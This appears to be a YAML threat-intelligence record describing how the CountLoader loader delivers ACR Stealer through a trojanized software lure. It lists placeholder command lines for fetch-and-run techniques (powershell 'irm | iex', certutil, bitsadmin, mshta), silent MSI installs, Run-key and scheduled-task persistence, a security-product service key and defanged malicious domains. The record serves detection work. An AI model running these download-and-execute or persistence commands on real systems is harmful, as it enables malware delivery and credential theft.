description: '''CountLoader Trojanized software lure used for initial access, followed
  by ACR Stealer payload execution.'''
attribution: Howler Cell Threat Intelligence Team
malware_families:
- CountLoader
- ACR Stealer
TTPs:
  processes:
  - mshta.exe
  - powershell.exe
  - rundll32.exe
  - curl.exe
  - bitsadmin.exe
  - certutil.exe
  - pythontest.exe
  - msiexec.exe
  commandline:
  - mshta.exe <URL>
  - cmd.exe /c start /b mshta.exe <URL>
  - powershell.exe -Command "irm <url> | iex"
  - rundll32 \"<UserProfile>\\module.dll, <ExportName>
  - curl.exe -k -o "<out>" "<url>"
  - bitsadmin.exe /transfer "<job>" /download /priority foreground "<url>" "<out>"
  - certutil.exe -urlcache -split -f "<url>" "<out>"
  - pythontest.exe \"<UserProfile>\\folder\\run.py\"
  - msiexec.exe /i \"<UserProfile>\\package.msi\" /quiet /qn
  powershell:
  - powershell.exe -Command "irm <url> | iex"
  scripting_engine: []
  registry_keys:
  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
  - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CrowdStrike Falcon
  image_load: []
  network_connections:
  - mshta.exe <URL>
  - globalsnn2-new[.]cc/WinX_DVD_Copy_Pro.zip
  - hxxps[://]alphazero1-endscape[.]cc
  - globalsnn3-new[.]cc
  - globalsnn1-new[.]cc
  - s1-rarlab[.]com
  - my-smart-house1[.]com
  - bucket-aws-s1[.]com
  file_activity:
  - Setup.exe
  - <UserProfile>\\folder\\run.py
  - <UserProfile>\\module.dll
  - <UserProfile>\\package.msi
  - WinX_DVD_Copy_Pro.zip
  - WinX_DVD_Copy_Pro.exe
  persistence:
  - Scheduled Task with name "GoogleTaskSystem136.0.7023.12" + <GUID-like string>
  - mshta.exe <URL>
  - cmd.exe /c start \"\" .\\original_filename & start \"\" mshta \"<C2_parameter>\"
  process_relations:
  - Setup.exe -> mshta.exe
  - mshta.exe -> powershell.exe
